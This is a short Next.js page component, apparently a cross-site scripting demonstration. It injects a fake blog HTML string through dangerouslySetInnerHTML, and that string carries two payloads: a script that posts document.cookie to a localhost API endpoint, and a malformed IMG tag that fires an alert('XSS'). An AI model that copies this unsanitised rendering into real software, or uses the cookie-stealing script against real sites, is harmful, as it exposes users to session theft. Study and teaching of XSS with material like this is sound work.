export default function CustomPage() {
  const blog=`
   <h3>This is a blog title </h3>
   <p>This is some blog text. There could be <b>bold</b> elements as well as <i>italic</i> elements here! <p>
    <script>fetch("http://localhost:3000/api/example", { method: "POST", headers: { "Content-Type": "application/json", }, body: JSON.stringify({ cookies: document.cookie })})</script>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
  `
    return (
        <div>
            <h1>Custom Page</h1>
            <p>Tshis is a custom route in your Next.js app.</p>

            <div dangerouslySetInnerHTML={{__html:blog}}/>
        </div>
    );
}
